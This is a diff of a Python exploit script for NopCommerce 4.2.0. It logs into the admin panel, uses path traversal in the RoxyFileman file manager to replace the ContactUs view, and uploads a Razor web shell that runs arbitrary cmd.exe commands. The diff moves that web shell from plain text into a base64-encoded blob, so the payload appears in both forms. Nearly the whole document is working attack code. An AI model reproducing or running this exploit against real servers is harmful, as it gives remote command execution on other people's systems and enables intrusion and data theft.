@@ -8,56 +8,137 @@
 # Tested on OS: Windows 10, CentOS, Docker
 # Exploit designed for: NopCommerce 4.2.0 on IIS
 
-import requests
 import argparse
+import base64
+import warnings
+
+import requests
 from bs4 import BeautifulSoup
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
-import warnings
+
 warnings.filterwarnings("ignore", category=UserWarning, module='bs4')
 
+def formatted_shell():
+    b64_shell = b'LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0zMTI1MjYxOTI4NzYwDQpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhd' \
+                b'GE7IG5hbWU9ImFjdGlvbiINCg0KdXBsb2FkDQotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTMxMjUyNjE5Mjg3NjANCk' \
+                b'NvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ibWV0aG9kIg0KDQphamF4DQotLS0tLS0tLS0tLS0tLS0tLS0' \
+                b'tLS0tLS0tLS0tLTMxMjUyNjE5Mjg3NjANCkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0iZCINCg0KL2lt' \
+                b'YWdlcy91cGxvYWRlZC8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi8uLi9pbmV0cHViL3d3d3Jvb3Qvbm9wY29tbWVyY2UvV' \
+                b'mlld3MvQ29tbW9uLw0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0zMTI1MjYxOTI4NzYwDQpDb250ZW50LURpc3Bvc2' \
+                b'l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9ImZpbGVzW10iOyBmaWxlbmFtZT0iQ29udGFjdFVzLmNzaHRtbCINCkNvbnRlbnQtVHl' \
+                b'wZTogaW1hZ2UvcG5nDQoNCkB1c2luZyBTeXN0ZW0NCkB1c2luZyBTeXN0ZW0uRGlhZ25vc3RpY3MNCg0KQHsgDQogICAgVmll' \
+                b'd0RhdGFbIlRpdGxlIl0gPSAiTVZDIFNoM2xsIFdpbmRvd3MiOw0KICAgIHZhciByZXN1bHQgPSAiIjsNCiAgICB2YXIgY21kI' \
+                b'D0gQ29udGV4dC5SZXF1ZXN0LlF1ZXJ5WyJjbWQiXTsNCiAgICBpZiAoIVN0cmluZy5Jc051bGxPckVtcHR5KGNtZCkpew0KIC' \
+                b'AgICAgICByZXN1bHQgPSBCYXNoKGNtZCk7DQogICAgfQ0KDQogICAgaWYgKFN0cmluZy5Jc051bGxPckVtcHR5KHJlc3VsdCk' \
+                b'pew0KICAgICAgICByZXN1bHQgPSAiSW52YWxpZCBjb21tYW5kIG9yIHNvbWV0aGluZyBkaWRuJ3Qgd29yayI7DQogICAgfQ0K' \
+                b'DQp9DQoNCkBmdW5jdGlvbnN7DQogICAgcHVibGljIHN0YXRpYyBzdHJpbmcgQmFzaCAoc3RyaW5nIGNtZCkNCiAgICB7DQogI' \
+                b'CAgICAgIHZhciByZXN1bHQgPSAiIjsNCiAgICAgICAgdmFyIGVzY2FwZWRBcmdzID0gY21kLlJlcGxhY2UoIlwiIiwgIlxcXC' \
+                b'IiKTsNCiAgICAgICAgdmFyIHByb2Nlc3MgPSBuZXcgUHJvY2VzcygpDQogICAgICAgIHsNCiAgICAgICAgICAgIFN0YXJ0SW5' \
+                b'mbyA9IG5ldyBQcm9jZXNzU3RhcnRJbmZvDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgRmlsZU5hbWUgPSAiY21k' \
+                b'LmV4ZSIsDQogICAgICAgICAgICAgICAgQXJndW1lbnRzID0gJCIvQyBcIntlc2NhcGVkQXJnc31cIiIsDQogICAgICAgICAgI' \
+                b'CAgICAgUmVkaXJlY3RTdGFuZGFyZE91dHB1dCA9IHRydWUsDQogICAgICAgICAgICAgICAgVXNlU2hlbGxFeGVjdXRlID0gZm' \
+                b'Fsc2UsDQogICAgICAgICAgICAgICAgQ3JlYXRlTm9XaW5kb3cgPSB0cnVlLA0KICAgICAgICAgICAgfQ0KICAgICAgICB9Ow0' \
+                b'KDQogICAgICAgIHByb2Nlc3MuU3RhcnQoKTsNCiAgICAgICAgcmVzdWx0ID0gcHJvY2Vzcy5TdGFuZGFyZE91dHB1dC5SZWFk' \
+                b'VG9FbmQoKTsNCiAgICAgICAgcHJvY2Vzcy5XYWl0Rm9yRXhpdCgpOw0KDQogICAgICAgIHJldHVybiByZXN1bHQ7DQogICAgf' \
+                b'Q0KfQ0KDQoNCg0KPHNjcmlwdA0KICBzcmM9Imh0dHBzOi8vY29kZS5qcXVlcnkuY29tL2pxdWVyeS0zLjIuMS5taW4uanMiDQ' \
+                b'ogIGludGVncml0eT0ic2hhMjU2LWh3ZzRnc3hnRlpoT3NFRWFtZE9ZR0JmMTNGeVF1aVR3bEFRZ3hWU05ndDQ9Ig0KICBjcm9' \
+                b'zc29yaWdpbj0iYW5vbnltb3VzIj48L3NjcmlwdD4NCjxzY3JpcHQ+DQokKGZ1bmN0aW9uKCkgew0KICAgIHZhciBjbWRSZXN1' \
+                b'bHQgPSAkKCIjY21kUmVzdWx0Iik7DQoNCgljb25zb2xlLmxvZyhjbWRSZXN1bHQpOw0KDQoJaWYgKGNtZFJlc3VsdC50ZXh0K' \
+                b'CkgPT09ICJJbnZhbGlkIGNvbW1hbmQgb3Igc29tZXRoaW5nIGRpZG4ndCB3b3JrIil7DQoJICAgIGNvbnNvbGUubG9nKCJzaG' \
+                b'91bGQgY2hhbmdlIHRleHQiKTsNCiAgICAgICAgY21kUmVzdWx0LmNzcygiY29sb3IiLCAicmVkIik7DQoJfQ0KCQ0KCXZhciB' \
+                b'0ZXJtID0gJCgiI2NvbnNvbGUiKTsNCiAgICAkKCIjY21kIikuZm9jdXMoKTsNCgl0ZXJtLnNjcm9sbFRvcCh0ZXJtLnByb3Ao' \
+                b'InNjcm9sbEhlaWdodCIpKTsNCgkNCgkkLnVybFBhcmFtID0gZnVuY3Rpb24obmFtZSl7DQogICAgICAgIHZhciByZXN1bHRzI' \
+                b'D0gbmV3IFJlZ0V4cCgnW1w/Jl0nICsgbmFtZSArICc9KFteJiNdKiknKS5leGVjKHdpbmRvdy5sb2NhdGlvbi5ocmVmKTsNCi' \
+                b'AgICAgICAgaWYgKHJlc3VsdHM9PW51bGwpew0KICAgICAgICAgICByZXR1cm4gbnVsbDsNCiAgICAgICAgfQ0KICAgICAgICB' \
+                b'lbHNlew0KICAgICAgICAgICByZXR1cm4gZGVjb2RlVVJJKHJlc3VsdHNbMV0pIHx8IDA7DQogICAgICAgIH0NCiAgICB9DQoN' \
+                b'CgkNCglmdW5jdGlvbiBleGVjdXRlQ21kKCl7DQogICAgICAgIHZhciBjbWQgPSBlbmNvZGVVUklDb21wb25lbnQoJCgiI2NtZ' \
+                b'CIpLnZhbCgpKTsNCgkgICAgdmFyIGN1cnJlbnRDbWQgPSAkLnVybFBhcmFtKCdjbWQnKTsNCgkgICAgY29uc29sZS5sb2coIn' \
+                b'Nob3VsZCByZXBsYWNlOiAiICsgY3VycmVudENtZCArICIgV0lUSDogIiArIGNtZCk7DQoNCgkgICAgdmFyIGN1cnJlbnRVcmw' \
+                b'gPSBsb2NhdGlvbi5ocmVmOw0KDQoJICAgIHZhciBwYXJhbURlbGltZXRlciA9ICIiOw0KCSAgICBpZiAoY3VycmVudFVybC5p' \
+                b'bmRleE9mKCI/IikgPCAwKXsNCgkgICAgICAgIHBhcmFtRGVsaW1ldGVyID0gIj8iOw0KCSAgICB9IGVsc2Ugew0KCSAgICAgI' \
+                b'CAgcGFyYW1EZWxpbWV0ZXIgPSAiJiI7DQoJICAgIH0NCiAgICAgICAgDQoJICAgIGlmIChjdXJyZW50VXJsLmluZGV4T2YoIm' \
+                b'NtZD0iKSA8IDApew0KICAgICAgICAgICAgY3VycmVudFVybCA9IGxvY2F0aW9uLmhyZWYgKyBwYXJhbURlbGltZXRlciArICJ' \
+                b'jbWQ9IjsNCgkgICAgfQ0KCQ0KICAgICAgICB2YXIgbmV3VXJsID0gY3VycmVudFVybC5yZXBsYWNlKC9jbWQ9LiovLCAiY21k' \
+                b'PSIrY21kKTsNCiAgICAgICAgd2luZG93LmxvY2F0aW9uLmhyZWYgPSBuZXdVcmw7DQoNCgkgICAgLy9jb25zb2xlLmxvZyhuZ' \
+                b'XdVcmwpOw0KCX0NCgkNCiAgICAkKCIjc3VibWl0Q29tbWFuZCIpLmNsaWNrKGZ1bmN0aW9uKCl7DQoJICAgIGV4ZWN1dGVDbW' \
+                b'QoKTsNCgl9KQ0KDQoJJCgiI2NtZCIpLmtleXByZXNzKGZ1bmN0aW9uIChlKSB7DQoJICAgIGlmIChlLndoaWNoID09IDEzKSB' \
+                b'7DQoJICAgICAgICBleGVjdXRlQ21kKCk7DQoJICAgICAgICByZXR1cm4gZmFsc2U7DQoJICAgIH0NCgl9KTsNCg0KCSQoIiNj' \
+                b'bWQiKS5vbigiY2hhbmdlIHBhc3RlIGtleXVwIiwgZnVuY3Rpb24odGhlVmFsKXsNCgkgICAgdmFyIGNtZCA9ICQoIiNjbWQiK' \
+                b'S52YWwoKTsNCgkgICAgJCgiI2NtZElucHV0IikudGV4dChjbWQpOw0KCX0pOw0KfSk7DQoNCjwvc2NyaXB0Pg0KDQoNCjxoMz' \
+                b'5AVmlld0RhdGFbIlRpdGxlIl0uPC9oMz4NCjxoND5AVmlld0RhdGFbIk1lc3NhZ2UiXTwvaDQ+DQo8aDQ+T3V0cHV0IGZvcjo' \
+                b'+IDxzcGFuIHN0eWxlPSJmb250LWZhbWlseTogbW9ub3NwYWNlOyBmb250LXdlaWdodDogbm9ybWFsOyI+QGNtZDwvc3Bhbj48' \
+                b'L2g0Pg0KDQoNCjxwcmUgaWQ9ImNvbnNvbGUiIHN0eWxlPSJjb2xvcjogIzAwZmYwMDtiYWNrZ3JvdW5kLWNvbG9yOiAjMTQxN' \
+                b'DE0O21heC1oZWlnaHQ6IDYwNnB4OyI+DQpDIzo+QGNtZA0KCQ0KPHNwYW4gaWQ9ImNtZFJlc3VsdCI+QHJlc3VsdDwvc3Bhbj' \
+                b'4NCgkNCkMjOj48c3BhbiBpZD0iY21kSW5wdXQiPjwvc3Bhbj4NCjwvcHJlPg0KDQo8YnIgLz4NCg0KPHA+RW50ZXIgeW91ciB' \
+                b'jb21tYW5kIGJlbG93OjwvcD4NCjxzcGFuIHN0eWxlPSJkaXNwbGF5OiBpbmxpbmUtZmxleCAhaW1wb3J0YW50OyI+DQogICAg' \
+                b'PGlucHV0ICBpZD0iY21kIiBjbGFzcz0iZm9ybS1jb250cm9sIiB0eXBlPSJ0ZXh0IiBzdHlsZT0id2lkdGg6IDQwMHB4OyIgL' \
+                b'z4gDQoJPGJ1dHRvbiBpZD0ic3VibWl0Q29tbWFuZCIgY2xhc3M9ImJ0biBidG4tcHJpbWFyeSI+U2VuZCE8L2J1dHRvbj4NCj' \
+                b'wvc3Bhbj4NCg0KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0zMTI1MjYxOTI4NzYwLS0='
+
+    return base64.b64decode(b64_shell).decode()
+
+
 def proxy(flag):
-    return {"http" : "http://127.0.0.1:9090", "https" : "http://127.0.0.1:9090"} if flag else None
+    return {"http": "http://127.0.0.1:9090", "https": "http://127.0.0.1:9090"} if flag else None
+
 
 def geturl(baseurl, type):
     if type == "login":
         return baseurl + "/login"
     elif type == "mv":
-        return baseurl + "/Admin/RoxyFileman/ProcessRequest?a=RENAMEDIR&d=%2fimages%2fuploaded%2f..%2F..%2F..%2F..%2F..%2F..%2F..%2Finetpub%2fwwwroot%2fnopcommerce%2fViews%2fCommon%2f&n=Common2"
-    elif type == "mkdir":	
-        return baseurl + "/Admin/RoxyFileman/ProcessRequest?a=CREATEDIR&d=%2fimages%2fuploaded%2f..%2F..%2F..%2F..%2F..%2F..%2F..%2Finetpub%2fwwwroot%2fnopcommerce%2fViews%2f&n=Common"
-    elif type == "put":	
+        return baseurl + "/Admin/RoxyFileman/ProcessRequest?a=RENAMEDIR&d=%2fimages%2fuploaded%2f" + \
+               "..%2F..%2F..%2F..%2F..%2F..%2F..%2Finetpub%2fwwwroot%2fnopcommerce%2fViews%2fCommon%2f&n=Common2"
+    elif type == "mkdir":
+        return baseurl + "/Admin/RoxyFileman/ProcessRequest?a=CREATEDIR&d=%2fimages%2fuploaded"\
+                         "%2f..%2F..%2F..%2F..%2F..%2F..%2F..%2Finetpub%2fwwwroot%2fnopcommerce%2fViews%2f&n=Common"
+    elif type == "put":
         return baseurl + "/Admin/RoxyFileman/ProcessRequest?a=UPLOAD"
-    elif type == "contactus":    
+    elif type == "contactus":
         return baseurl + "/contactus"
     else:
         return ""
+
 
 def login(email, password, url, proxy):
     res = requests.get(geturl(url, "login"), proxies=proxy, verify=False, allow_redirects=False)
     cookie = res.cookies.get_dict()
     soup = BeautifulSoup(res.text, features="html.parser")
-    token = soup.find("input", {"name":"__RequestVerificationToken"})["value"]
-    res = requests.post(geturl(url, "login"), cookies=cookie, data={"Email":email, "Password":password, "__RequestVerificationToken":token, "RememberMe":"false"}, proxies=proxy, verify=False, allow_redirects=False)
+    token = soup.find("input", {"name": "__RequestVerificationToken"})["value"]
+    res = requests.post(geturl(url, "login"), cookies=cookie,
+                        data={"Email": email, "Password": password, "__RequestVerificationToken": token,
+                              "RememberMe": "false"}, proxies=proxy, verify=False, allow_redirects=False)
     cookies = res.cookies.get_dict()
-    return { **cookies, **cookie }
+    return {**cookies, **cookie}
+
 
 def shellupload(email, password, url, proxy):
-    print("[+] Trying uploading shell from")	
+    print("[+] Trying uploading shell from")
     cookies = login(email, password, url, proxy)
     # Rename Common Directory
-    requests.get(geturl(url, "mv"), headers={"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"}, proxies=proxy, cookies=cookies, verify=False, allow_redirects=False)
+    requests.get(geturl(url, "mv"), headers={
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"}, proxies=proxy,
+                 cookies=cookies, verify=False, allow_redirects=False)
     # Create Common Directory
-    requests.get(geturl(url, "mkdir"), headers={"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"}, proxies=proxy, cookies=cookies, verify=False, allow_redirects=False)
+    requests.get(geturl(url, "mkdir"), headers={
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"}, proxies=proxy,
+                 cookies=cookies, verify=False, allow_redirects=False)
     # Upload File into Common
-    requests.post(geturl(url, "put"), headers={"Content-Type" : "multipart/form-data; boundary=---------------------------3125261928760" ,"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"}, data="-----------------------------3125261928760\r\nContent-Disposition: form-data; name=\"action\"\r\n\r\nupload\r\n-----------------------------3125261928760\r\nContent-Disposition: form-data; name=\"method\"\r\n\r\najax\r\n-----------------------------3125261928760\r\nContent-Disposition: form-data; name=\"d\"\r\n\r\n/images/uploaded/../../../../../../../../../../inetpub/wwwroot/nopcommerce/Views/Common/\r\n-----------------------------3125261928760\r\nContent-Disposition: form-data; name=\"files[]\"; filename=\"ContactUs.cshtml\"\r\nContent-Type: image/png\r\n\r\n@using System\r\n@using System.Diagnostics\r\n\r\n@{ \r\n    ViewData[\"Title\"] = \"MVC Sh3ll Windows\";\r\n    var result = \"\";\r\n    var cmd = Context.Request.Query[\"cmd\"];\r\n    if (!String.IsNullOrEmpty(cmd)){\r\n        result = Bash(cmd);\r\n    }\r\n\r\n    if (String.IsNullOrEmpty(result)){\r\n        result = \"Invalid command or something didn't work\";\r\n    }\r\n\r\n}\r\n\r\n@functions{\r\n    public static string Bash (string cmd)\r\n    {\r\n        var result = \"\";\r\n        var escapedArgs = cmd.Replace(\"\\\"\", \"\\\\\\\"\");\r\n        var process = new Process()\r\n        {\r\n            StartInfo = new ProcessStartInfo\r\n            {\r\n                FileName = \"cmd.exe\",\r\n                Arguments = $\"/C \\\"{escapedArgs}\\\"\",\r\n                RedirectStandardOutput = true,\r\n                UseShellExecute = false,\r\n                CreateNoWindow = true,\r\n            }\r\n        };\r\n\r\n        process.Start();\r\n        result = process.StandardOutput.ReadToEnd();\r\n        process.WaitForExit();\r\n\r\n        return result;\r\n    }\r\n}\r\n\r\n\r\n\r\n<script\r\n  src=\"https://code.jquery.com/jquery-3.2.1.min.js\"\r\n  integrity=\"sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=\"\r\n  crossorigin=\"anonymous\"></script>\r\n<script>\r\n$(function() {\r\n    var cmdResult = $(\"#cmdResult\");\r\n\r\n\tconsole.log(cmdResult);\r\n\r\n\tif (cmdResult.text() === \"Invalid command or something didn't work\"){\r\n\t    console.log(\"should change text\");\r\n        cmdResult.css(\"color\", \"red\");\r\n\t}\r\n\t\r\n\tvar term = $(\"#console\");\r\n    $(\"#cmd\").focus();\r\n\tterm.scrollTop(term.prop(\"scrollHeight\"));\r\n\t\r\n\t$.urlParam = function(name){\r\n        var results = new RegExp('[\\?&]' + name + '=([^&#]*)').exec(window.location.href);\r\n        if (results==null){\r\n           return null;\r\n        }\r\n        else{\r\n           return decodeURI(results[1]) || 0;\r\n        }\r\n    }\r\n\r\n\t\r\n\tfunction executeCmd(){\r\n        var cmd = encodeURIComponent($(\"#cmd\").val());\r\n\t    var currentCmd = $.urlParam('cmd');\r\n\t    console.log(\"should replace: \" + currentCmd + \" WITH: \" + cmd);\r\n\r\n\t    var currentUrl = location.href;\r\n\r\n\t    var paramDelimeter = \"\";\r\n\t    if (currentUrl.indexOf(\"?\") < 0){\r\n\t        paramDelimeter = \"?\";\r\n\t    } else {\r\n\t        paramDelimeter = \"&\";\r\n\t    }\r\n        \r\n\t    if (currentUrl.indexOf(\"cmd=\") < 0){\r\n            currentUrl = location.href + paramDelimeter + \"cmd=\";\r\n\t    }\r\n\t\r\n        var newUrl = currentUrl.replace(/cmd=.*/, \"cmd=\"+cmd);\r\n        window.location.href = newUrl;\r\n\r\n\t    //console.log(newUrl);\r\n\t}\r\n\t\r\n    $(\"#submitCommand\").click(function(){\r\n\t    executeCmd();\r\n\t})\r\n\r\n\t$(\"#cmd\").keypress(function (e) {\r\n\t    if (e.which == 13) {\r\n\t        executeCmd();\r\n\t        return false;\r\n\t    }\r\n\t});\r\n\r\n\t$(\"#cmd\").on(\"change paste keyup\", function(theVal){\r\n\t    var cmd = $(\"#cmd\").val();\r\n\t    $(\"#cmdInput\").text(cmd);\r\n\t});\r\n});\r\n\r\n</script>\r\n\r\n\r\n<h3>@ViewData[\"Title\"].</h3>\r\n<h4>@ViewData[\"Message\"]</h4>\r\n<h4>Output for:> <span style=\"font-family: monospace; font-weight: normal;\">@cmd</span></h4>\r\n\r\n\r\n<pre id=\"console\" style=\"color: #00ff00;background-color: #141414;max-height: 606px;\">\r\nC#:>@cmd\r\n\t\r\n<span id=\"cmdResult\">@result</span>\r\n\t\r\nC#:><span id=\"cmdInput\"></span>\r\n</pre>\r\n\r\n<br />\r\n\r\n<p>Enter your command below:</p>\r\n<span style=\"display: inline-flex !important;\">\r\n    <input  id=\"cmd\" class=\"form-control\" type=\"text\" style=\"width: 400px;\" /> \r\n\t<button id=\"submitCommand\" class=\"btn btn-primary\">Send!</button>\r\n</span>\r\n\r\n-----------------------------3125261928760--", proxies=proxy, cookies=cookies, verify=False, allow_redirects=False)
+    requests.post(geturl(url, "put"),
+                  headers={"Content-Type": "multipart/form-data; boundary=---------------------------3125261928760",
+                           "User-Agent": "Mozilla/5.0 Gecko/20100101 Firefox/67.0"},
+                  data=formatted_shell(),
+                  proxies=proxy, cookies=cookies, verify=False, allow_redirects=False)
     # Test if it is working
-    res = requests.get(geturl(url, "contactus"), headers={"User-Agent" : "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"}, proxies=proxy, cookies=cookies, verify=False, allow_redirects=False)
+    res = requests.get(geturl(url, "contactus"), headers={
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:67.0) Gecko/20100101 Firefox/67.0"}, proxies=proxy,
+                       cookies=cookies, verify=False, allow_redirects=False)
     soup = BeautifulSoup(res.text, features="html.parser")
-    test = soup.find("span", {"id" : "cmdResult"})
+    test = soup.find("span", {"id": "cmdResult"})
     if test is None:
         print("[-] Maybe the target is not vulnerable, or you need to restart the appliance")
     else:
         print("[+] Shell uploaded under contact us page")
+
 
 def main():
     parser = argparse.ArgumentParser(description='Upload a shell in NopCommerce')
@@ -73,6 +154,7 @@ def main():
     args = parser.parse_args()
 
     shellupload(args.email, args.password, args.url, proxy(args.proxy))
+
 
 if __name__ == '__main__':
     requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
